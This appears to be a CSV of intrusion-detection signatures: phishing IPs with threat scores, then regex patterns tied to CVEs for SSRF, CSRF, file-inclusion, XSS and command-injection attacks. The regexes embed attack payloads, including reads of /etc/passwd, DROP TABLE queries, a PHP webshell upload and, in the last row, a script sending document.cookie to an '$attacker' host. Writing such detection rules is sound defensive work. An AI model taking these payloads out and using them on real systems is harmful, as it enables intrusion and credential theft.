name,description,signature,threat_score,color,background_color,link,CVE,CVSS,,
Phishing,Known Phishing IP detected,74\.208\.242\.68,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,75\.103\.67\.172,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,75\.103\.88\.221,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,77\.73\.3\.177,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,79\.143\.25\.190,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,80\.227\.247\.35,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,82\.221\.139\.139,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,82\.221\.141\.14,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,82\.221\.141\.170,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,82\.221\.141\.176,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,82\.223\.22\.158,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,82\.236\.66\.34,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,83\.240\.184\.26,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,84\.234\.96\.235,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,87\.120\.37\.61,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,88\.203\.195\.195,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,89\.249\.67\.53,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,89\.45\.67\.32,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,91\.209\.70\.205,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,91\.236\.197\.35,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,92\.55\.94\.30,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,92\.63\.192\.236,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,93\.115\.97\.150,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,93\.182\.171\.6,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,93\.88\.76\.204,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,94\.191\.23\.207,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,94\.237\.28\.204,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,94\.32\.66\.41,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Phishing,Known Phishing IP detected,95\.140\.32\.250,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Oracle - Server-Side Request Forgery,"The attack involves manipulating the IMServlet by sending malicious requests to trigger specific actions, potentially leading to Server-Side Request Forgery vulnerabilities.",(?i)IMServlet\?Method=CONNECT|IMServlet\?Method=GOOGLE_PRESENCE&im_to_user=[\w\d]+&im_server_name=GOOGLE&im_server=[\w\d.-]+:[\d]+/\?param,7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-3546,2017-3546,6.5,,
0.4.4 < 0.5.5 - Server-Side Request Forgery,an attacker can manipulate the url parameter in the query string of the fuc.js.php script to make requests to arbitrary URLs,"GET /assets/lib/fuc\.js\.php\?url=http:\/\/(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(\/\S*)? HTTP\/1\.1",7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-9302,2018-9302,9.1,,
7.8.4 - Multiple Vulnerabilities,allow attackers to inject malicious scripts into web pages viewed by other users.,GET /ajax/user\?session=[a-zA-Z0-9]+&name=[\w\d]+&id=\d+&action=setAttribute,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-17062,2018-5756 2018-5755 2018-5754 2018-5753 2018-5752 2018-5751 2017-17062,8.8,,
D-LINK Central WifiManager CWM-100,"the ability of an attacker to conduct port scans, perform reconnaissance, and potentially bypass security controls",\/index\.php\/System\/MailConnect\/host\/[a-zA-Z0-9.-]+\/port\/\d+\/secure\/,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Cortex Unshortenlink Analyzer,allows an attacker to make requests to internal resources or other external systems,"http:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}",5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-7652,2019-7652,7.7,,
XML External Entity Injection ,"the attack is to upload a JSP shell onto the target system, which could lead to remote code execution.",https:\/\/.*\/service\/proxy\?target=https:\/\/.*\/service\/admin\/soap,8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-9621,2019-9621,7.5,,
Filepicker 3.5.2,An attacker can use this vulnerability to scan the internal network and potentially exploit internal web services.,POST \/repository\/repository_ajax.php\?action=signin HTTP\/1\.1\r\nHost: [^\\n]+(\r\n[A-Za-z\-]+: [^\n]+)*\r\nConnection: close\r\nCookie: [^\\n]+;\r\n\r\nfile=InternalURL\?parameter=XXEInjection&repo_id=\d,8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-1042,2018-1042,6.5,,
 Unauthenticated Server-Side Request Forgery,"allows an attacker to send crafted requests to internal network services, potentially bypassing firewalls","curl\shttp:\/\/\d+\.\d+\.\d+\.\d+\/cgi-bin\/onvif.cgi\s-X\sPOST\s-d""mod=GetImage&host=http:\/\/\d+\.\d+\.\d+\.\d+:\d+&par=\d+""",9,#00000A,#ff00004a,N/A,N/A,N/A,,
2.0.8 - Change Admin Password,"The Persistent XSS allows for unauthorized code execution on the client side, and the CSRF vulnerability enables an attacker to perform actions on behalf of an authenticated user without their knowledge.",\/admin\/user\/add\sHTTP\/1\.1.*\buserUsername=.*(?:,6,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2020-7991,2020-7991,8.8,,
2.1.1 -Add Admin,the attacker can add a new administrator account and gain unauthorized control over the router's configurations.,POST /form2userconfig.cgi HTTP/1\.1[\s\S]*?username=[^&]+&privilege=\d+&newpass=[^&]+&confpass=[^&]+&adduser=Add&hiddenpass=&submit\.htm%3Fuserconfig\.htm=Send,5,#00000A,#ff00004a,N/A,N/A,N/A,,
phpMyAdmin 4.7.x,drop table attack,\/sql\.php\?db=[^&]+&table=[^&]+&sql_query=DROP\+TABLE,8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-1000499,2017-1000499,8.8,,
phpMyAdmin 4.7.x,Password modificationCSRF attack,\/sql\.php\?db=[^&]+&table=[^&]+&sql_query=SET\+password,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-1000499,2017-1000499,8.8,,
phpMyAdmin 4.7.x,arbitary file write attack ,\/sql\.php\?db=[^&]+&table=[^&]+&sql_query=select.*into\+outfile,9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-1000499,2017-1000499,8.8,,
phpMyAdmin 4.7.x,Data retrieval over DNS attack  ,SELECT\s+LOAD_FILE\(CONCAT,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-1000499,2017-1000499,8.8,,
phpMyAdmin 4.7.x,empty rows from all tables attack ,\/import\.php\?db=[^&]+&table=[^&]+&sql_query=DROP\+PROCEDURE\+IF\+EXISTS\+EMPT,6,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-1000499,2017-1000499,8.8,,
pfSense 2.3.2 ,"The attacker exploits RXSS to bypass CSRF protection and execute commands on the pfSense system, potentially leading to a remote root shell.","(?:status_captiveportal_(?:php|expire|test|voucher_rolls|vouchers)\.php\?zone=)([^""&\s]+)",6,#00000A,#ff00004a,N/A,N/A,N/A,,
2020 - Cross-Site Request Forgery,The attack seems to involve modifying the login form to perform actions such as changing the username and password of the currently logged-in user.,POST \/olk\/client\/login\.asp HTTP\/1\.1.*?Referer: https:\/\/examplesite\.com\/olk\/client\/login\.asp\?se=Y.*?UserName=%22%3EPOC&Password=%22%3ECSRF&,5,#00000A,#ff00004a,N/A,N/A,N/A,,
1.1.3 - Cross-Site Request Forgery,attempts to submit a login form with predefined credentials to the Intelbras Router RF1200 web interface,"<form\s*method=""POST""\s*action=""http:\/\/IPROUTERRF1200\/login\/Auth"">\s*<input\s*type=""hidden""\s*name=""username""\s*value=""admin""\/>\s*<input\s*type=""hidden""\s*name=""password""\s*value=""21232f297a57a5a743894a0e4a801fc3""\/>\s*<input\s*type=""submit""\s*value=""Submit"">\s*<\/form>",6,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-19516,2019-19516,6.5,,
Solar Technology - 1.6 - CSRF,the attacker tricks an authenticated user into visiting a page containing the CSRF exploit.,"<form.*action=['""]http:\/\/\d+\.\d+\.\d+\.\d+\/wb_network_changed\.htm['""].*id=['""]csrf-form['""].*<\/form>",8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-13529,2019-13529,8.8,,
phpMyAdmin 4.9.0.1,This attack aims to trick a phpMyAdmin user into clicking on a malicious link or loading a page containing the CSRF exploit.,http:\/\/server\/phpmyadmin\/setup\/index\.php\?page=servers&mode=remove&id=1,8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-12922,2019-12922,5.3,,
Enigma NMS 65.0.0,"the attack abuses the Enigma NMS web application's insufficient CSRF protection, allowing an attacker to upload a malicious PHP file and gain control over the server by triggering a reverse shell connection. ",http:\/\/<enigma_nms_ipaddr>\/cgi-bin\/protected\/manage_files\.cgi,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-16068,2019-16068,8.8,,
5.0.83 - Cross-Site Request Forgery,"The attacker can trick a victim into performing actions on the application, in this case, deleting a user",http:\/\/[a-zA-Z0-9.-]+\/ajax\.php\?page=include\/ajax\/delete_item_general&delete_item=1&name=delete_user&id=\[ID\],5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-19829,2018-19829,6.5,,
Cisco Wireless Controller,"The vulnerability allows an attacker to perform certain actions, in this case, adding an admin user",http:\/\/IP\/security\/cfgSecurityAAAUsersCreate,9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-12624,2019-12624,8.8,,
74CMS 5.0.1 add New Admin User,The vulnerability allows an attacker to add a new admin user by exploiting the lack of proper CSRF protection on the index.php?m=Admin&c=admin&a=add URI,http:\/\/localhost\/index\.php\?m=Admin&c=admin&a=add,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-11374,2019-11374,8.8,,
Msvod Change User Information,"The vulnerability allows an attacker to change user information via the admin/member/edit.html URI, exploiting the lack of proper CSRF protection",http:\/\/a\.msvodx\.cn\/admin\/member\/edit\.html,6,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-11375,2019-11375,6.5,,
Huawei Send SMS,attacker sends an SMS without the user's consent when the administrator with authenticated access opens a malicious URL.,http:\/\/192\.168\.8\.1\/api\/sms\/send-sms,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2014-5395,2014-5395,N/A,,
5.3 - Local File Inclusion,The attack pattern is attempting to access sensitive system files using a crafted parameter (f),"GET\sMethod\s*:\s*http:\/\/[^\s]+\/getfiles\?f=\/(\.\.\/){10,}proc\/version",7,#00000A,#ff00004a,N/A,N/A,N/A,,
1.11 - Cross-Site Scripting / Local File Inclusion,"It allows an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential compromise of sensitive information from the targeted system.","<script\s+src\s*=\s*[""'](http:\/\/localhost\/4\/osTicket-v1\.11\/upload\/file\.php\?key=[^""']+[""'])><\/script>",5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-11537,2019-11537,6.1,,
(Authenticated) Local File Inclusion (2),The attacker runs a SQL query to insert PHP code (<?php phpinfo();exit;?>) into the database.,index\.php\?target=db_sql\.php%253f\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/var\/lib\/php\/sessions\/sess_[a-f0-9]+,9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-12613,2018-12613,8.8,,
1.1.1 - Local File Inclusion,The attacker exploits the Local File Inclusion vulnerability by providing a specially crafted path (/etc/passwd) to the ajax_path parameter.,/ajax_shortcode_pattern\.php\?ajax_path=\/etc\/passwd,7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-7422,2018-7422,7.5,,
 4.3.2 - Cross-Site Scripting / Remote File Inclusion,The attacker exploits the Reflected Cross-Site Scripting (XSS) vulnerability by injecting a malicious script into the description parameter ,/mcm/resources/\?description=<script>[^<>]+<\/script>&prototype=<script>[^<>]+<\/script>,9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-5799,2017-5799 2017-5798,8.8,,
Jaxer 1.0.3.4547 - Local File inclusion,The attacker exploits the Local File Inclusion (LFI) vulnerability by manipulating the filename parameter of the specified URL.,\/aptana\/tools\/sourceViewer\/index\.html\?filename=\.+\.\.\/,9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-14312,2019-14312,6.5,,
4.8.2 - Local File Inclusion,The attacker exploits the Local File Inclusion (LFI) vulnerability in FlightPath by manipulating the form_include parameter of the specified POST request.,POST \/flightpath\/index\.php\?q=system-handle-form-submit HTTP\/1\.1[\s\S]*form_include=\.+\.\.\/,7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-13396,2019-13396,5.3,,
 10.4.4 - Local File Inclusion,The attacker exploits the Local File Inclusion (LFI) vulnerability in IceWarp by manipulating the style parameter of the specified URL.,\/webmail\/calendar\/minimizer\/index\.php\?style=\.+\%5c\.\.+\%5c\.\.+\%5c\.\.+\%5c\.\.+\%5c\.\.+\%5c\.\.+\%5c\.\.+,7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-12593,2019-12593,7.5,,
1.0.67 - Cross-Site Request Forgery / Local File Inclusion,The attacker tricks a logged-in administrator into visiting a malicious website containing the crafted form.,\/wp-admin\/admin-ajax\.php\?action=\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.+,6,#00000A,#ff00004a,N/A,N/A,N/A,,
2.13.0097 - Directory Traversal / Local File Inclusion,"The attack aims to exploit a Directory Traversal & LFI vulnerability in the Thomson Reuters application, potentially allowing an attacker to access and retrieve sensitive files from the target system. ",GET \.+\.\.\\\.\.\\\.\.\\\.\.\\\.\.\\\.\.\\\.\. HTTP/1\.1,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-8385,2019-8385,9.8,,
4.18.63 - Local File Inclusion (PoC),"This action is part of the file scan functionality, which is vulnerable to local file inclusion.",admin-ajax\.php\?action=GOTMLS_scan,9,#00000A,#ff00004a,N/A,N/A,N/A,,
 2.2.1 - Local File Inclusion,It allows an attacker to include files on a server through the web browser.,\/wp-admin\/admin\.php\?path=.*&bundle=.*&domain=.*&page=loco-theme&action=file-view,9,#00000A,#ff00004a,N/A,N/A,N/A,,
3505 - Directory Traversal / Local File Inclusion,It allows an authenticated user to navigate outside of the intended directory structure and access arbitrary files on the server,\/PreviewHandler\.ashx\?path=\\\.+\&filename=.+,9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-10009,2019-10009,6.5,,
1.0 - Local File Inclusion,"By manipulating the cfg parameter, an attacker can include arbitrary files on the server, such as /etc/passwd. ",\/gracemedia-media-player\/templates\/files\/ajax_controller\.php\?ajaxAction=getIds&cfg=.*%2Fetc%2Fpasswd,8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-9618,2019-9618,9.8,,
2018-11 Patch Remote File Inclusion,"an attacker can force the web server to download and display arbitrary files, either from a remote location (http or https) or from the local file system (file://).",\/api\/DownloadUrlResponse\.ashx\?url=(file:\/\/|https?:\/\/),5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-15657,2018-15657,7.3,,
5.8 - Local File Inclusion,"This attack targets a vulnerability in PHP Dashboards where an attacker can perform local file inclusion by manipulating the ""filename"" parameter ",\/php\/file\/read\.php HTTP\/1\.1\r\nHost: .*\r\nUser-Agent: .*\r\nAccept: .*\r\nAccept-Language: .*\r\nAccept-Encoding: .*\r\nContent-Type: .*\r\nContent-Length: .*\r\nCookie: PHPSESSID=.*\r\nDNT: .*\r\nConnection: .*\r\nUpgrade-Insecure-Requests: .*\r\nfilename=.*: undefined\r\nHTTP\/1\.1 200 OK\r\nServer: .*\r\nDate: .*\r\nContent-Type: .*\r\nTransfer-Encoding: .*\r\nConnection: .*\r\nHost-Header: .*,5,#00000A,#ff00004a,N/A,N/A,N/A,,
 3.0.0 - Local File Inclusion,The attacker is attempting to read files from the server by manipulating the getcss and getjs parameters.,\/backend\/backend_theme\/edit(css|js)\/\sHTTP\/1\.1\nHost:\s[TARGET],5,#00000A,#ff00004a,N/A,N/A,N/A,,
PHP-Proxy 5.1.0 - Local File Inclusion,"It is attempting to exploit the PHP-Proxy 5.1.0 application's LFI vulnerability by using a default app_key to generate an encrypted string. This string, when appended to the URL, aims to read arbitrary local files on the server. ",http:\/\/php-proxy-site\/index\.php\?q=\[[a-zA-Z0-9_-]+\],6,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-19246,2018-19246,7.5,,
PHP Proxy 3.0.3 - Local File Inclusion,it is attempting to exploit the PHP-Proxy 3.0.3 application's LFI vulnerability. This allows any user to read files from the server without authentication by manipulating the URL to include a file path after file:///.,http:\/\/[^\/]+\/index\.php\?q=file:\/\/\/[a-zA-Z0-9\/_]+,9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-19458,2018-19458,7.5,,
 Daemon - Local File Inclusion,"it is exploiting a vulnerability in uc-httpd, a widely used HTTP daemon in IoT devices, primarily security cameras.",GET \.\./\.\./\.\./\.\./\.\./[a-zA-Z0-9\/_]+ HTTP/1\.0,6,#00000A,#ff00004a,N/A,N/A,N/A,,
0.6.1.2 - Local File Inclusion,an attacker can manipulate input parameters or file paths to include and retrieve files from the target system that are not intended to be publicly accessible.,GET\s+\/\[PATH\]\/index\.php\?content=.*?HTTP\/1\.1\r\nHost:\s+TARGET,6,#00000A,#ff00004a,N/A,N/A,N/A,,
941 - Authentication Bypass,"The script essentially automates the process of creating a user account with admin privileges and, optionally, attempts to exploit an LFI vulnerability.",POST \/u\/jsp\/security\/user_save_do.jsp HTTP\/1\.\d\r\nHost: \S+\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n.*\r\n,5,#00000A,#ff00004a,N/A,N/A,N/A,,
D-Link Central WiFiManager,allows an unauthenticated attacker to upload a malicious PHP file to the target server,"ftp\.connect\(host=""([^""]+""), port=(\d+)\).*?ftp\.login\(""([^""]+""), ""([^""]+"").*?poc_php_file\.write\(""<\?php\\nsystem\('whoami'\);\\n\?>""\).*?ftp\.storbinary\(""STOR write_file\.php"", php_file\).*?session\.get\('https://(\d+\.\d+\.\d+\.\d+)/public/write_file\.php', verify=False\)",7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-17443,2018-17443 2018-17442 2018-17441 2018-17440,9.8,,
Oracle Developer Component ,The attack seems to leverage a reflected XSS vulnerability.,https:\/\/<ip>\/reports\/rwservlet\/showenv%22%3E%3Cimg%20src=x%20onerror=prompt\(1\);%3E,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-2413,2019-2413,6.1,,
Cisco Firepower Management ,The attack involves crafting a malicious link with an XSS payload and tricking a user into clicking it.,"https:\/\/\/platinum\/platformSettingEdit\.cgi\?type=.*?"">",8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-1642,2019-1642,6.1,,
'assets/edit/host.php?whid=5' Cross-Site Scripting,"injecting a malicious payload into the ""Web Host Name"" and ""Web Host's URL"" fields","\/assets\/edit\/host\.php\?whid=5.*?Web\ Host\ Name.*?Web\ Host's\ URL.*?""><img\ src=x\ onerror=alert\(""XSSed-By-Abdul-Kareem""\)>",8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-19915,2018-19915,4.8,,
'assets/add/dns.php' Cross-Site Scripting,"involves injecting a malicious payload into the ""Profile Name"" and ""Notes"" fields","\/assets\/add\/dns\.php.*?Profile\ Name.*?Notes.*?""><img\ src=x\ onerror=alert\(""XSSed-By-Abdul-Kareem""\)>",5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-19914,2018-19914,4.8,,
" 'category.php CatagoryName, StakeHolder' Cross-Site Scripting","injecting a malicious payload into the ""Category Name"" and ""Stakeholder"" fields ","\/assets\/add\/category\.php.*?Category\ Name.*?StakeHolder.*?""><img\ src=x\ onerror=alert\(""Xss-By-Abdul-Raheem""\)>",9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-20011,2018-20011,4.8,,
'ssl-accounts.php username' Cross-Site Scripting,"injecting a malicious payload into the ""Username"" field ","\/assets\/add\/ssl-provider-account\.php.*?username.*?""><img\ src=x\ onerror=alert\(""Xss-By-Abdul-Raheem""\)>",8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-20010,2018-20010,4.8,,
'ssl-provider-name' Cross-Site Scripting,"injecting a malicious payload into the ""SSL Provider Name"" and ""SSL Provider's URL"" fields","\/assets\/add\/ssl-provider\.php.*?ssl-provider-name.*?ssl-provider's-url.*?""><img\ src=x\ onerror=alert\(""Xss-By-Abdul-Raheem""\)>",7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-20009,2018-20009,4.8,,
1.11 - Cross-Site Scripting / Local File Inclusion,"The attack involves exploiting two different XSS vulnerabilities in the ""Import"" field on the Agent Panel","\/upload\/scp\/users.php\?do=import-users.*?import.*?filename=""users-\d+\.csv"".*?script src=",7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-11537,2019-11537,6.1,,
 Persistent Cross-Site Scripting,"insert a malicious payload into the ""firstname"" and ""lastname"" fields",\/setup\/install.php.*firstname=.*&lastname=,9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-14750,2019-14750,6.1,,
Persistent Cross-Site Scripting via File Upload,"allows a non-agent user to upload a file containing a malicious payload, such as a JavaScript script",\/open\.php\/tickets\/\d+\/upload\/\d+,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-14748,2019-14748,5.4,,
LimeSurvey 3.17.13 - Cross-Site Scripting,allow an attacker to execute arbitrary JavaScript code within the context of the victim's browser,<svg/onload=alert\(document\.cookie\)>,8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2019-16173,2019-16173 2019-16172,5.4,,
Universal Cross-Site Scripting,attack involves creating iframes  to navigate and manipulate the document,"onpageshow\s*=\s*.*?navigate\s*\(\s*window\s*,\s*['""].*?\.xyz\/['""]\s*\)\s*;\s*showModalDialog\s*\(\s*createURL\s*\(\s*`.*?setInterval\s*\(\s*=>\s*\{.*?try\s*\{\s*opener\.document\.x\s*\;\s*\}\s*catch\s*\(\s*e\s*\)\s*\{\s*clearInterval\s*\",9,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-2510,2017-2510,6.1,,
Universal Cross-Site Scripting,the WebKit engine and involves a manipulation of the DOM tree that can lead to an inconsistent state,"parserRemoveChild\s*\(\s*\*newChild\s*\)\s*;\s*if\s*\(\s*document\s*\(\)\s*!=\s*\*newChild->document\s*\(\)\s*\)\s*document\s*\(\)\.adoptNode\s*\(\s*\*newChild\.get\s*\(\)\s*,\s*ASSERT_NO_EXCEPTION\s*\)\s*;\s*\{\s*EventDispatchForbiddenScope\s*assertNoEventDispatch\s*;\s*ScriptForbiddenScope\s*forbidScript\s*;\s*treeScope\s*\(\)\.adoptIfNeeded\s*\(\s*\*\*newChild\s*\)\s*;\s*insertBeforeCommon\s*\(\s*nextChild\s*,\s*\*\*newChild\s*\)\s*;\s*\*newChild\s*->updateAncestorConnectedSubframeCountForInsertion\s*\(\s*\)\s*;\s*ChildListMutationScope\s*\(\s*\*\*this\s*\)\.childAdded\s*\(\s*\*\*newChild\s*\)\s*;\s*\}\s*notifyNodeInserted\s*\(\s*\*\*newChild\s*,\s*ChildrenChangeSourceParser\s*\)\s*;",5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-2508,2017-2508,6.1,,
Universal Cross-Site Scripting,"The issue can lead to an unintended inheritance of the opener frame's security origin, potentially causing security implications.",void Document::initSecurityContext\(\)\s*{(?:.|\s)*?if\s*\(!shouldInheritSecurityOriginFromOwner\(m_url\)\)\s*return;\s*Frame\* parentFrame = m_frame->tree\(\).parent\(\);\s*Frame\* openerFrame = m_frame->loader\(\).opener\(\);\s*Frame\* ownerFrame = parentFrame;\s*if\s*\(!ownerFrame\)\s*ownerFrame = openerFrame;\s*if\s*\(!ownerFrame\)\s*\{(?:.|\s)*?\sdidFailToInitializeSecurityOrigin\(\);\s*return;\s*\}(?:.|\s)*?setCookieURL\(ownerFrame->document\(\)->cookieURL\(\)\);\s*setSecurityOriginPolicy\(ownerFrame->document\(\)->securityOriginPolicy\(\)\);\s*(?:.|\s)*?},8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-2528,2017-2528,6.1,,
Universal Cross-Site Scripting,the attack involves setting a property (test) on an object from another origin and manipulating its behavior to execute arbitrary code ,JSObject::putInlineSlow\s*\(.*getPrototypeDirect.*\)\s*\{(?:.|\s)*?\},8,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2017-7037,2017-7037,8.8,,
1.0.4 - Cross-Site Scripting,this XSS vulnerability allows an attacker to inject and execute arbitrary script code on the target website.,<script>alert\('ManhNho'\)<\/script>,5,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-9857,2018-9857,6.1,,
 7300T - Multiple Vulnerabilities,The attack allows an attacker to inject arbitrary commands into the device through crafted JSON input,"POST \/wbm\/configtools\.php HTTP\/1\.[01]\r\nHost: <IP-Address>\r\nContent-type: text\/plain\r\n\r\n\{""sessionId"":""[^""]*"",""aDeviceParams"":\{""0"":\{""name"":""firewall"",""parameter"":\[""iptables"",""--get-xml""\],""sudo"":true,""multiline"":true,""timeout"":10000\},""1"":\{""name"":""firewall"",""parameter"":\[""firewall"",""--is-enabled""\],""sudo"":true,""multiline"":true,""timeout"":10000,""dataId"":""\{DoNotParseAsXml\}<img src=x onerror=this.src='http:\/\/\$attacker:8001\/\?c='+document\.cookie>;""\}\}\}",7,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-12981,2018-12981 2018-12980 2018-12979,8.8,,
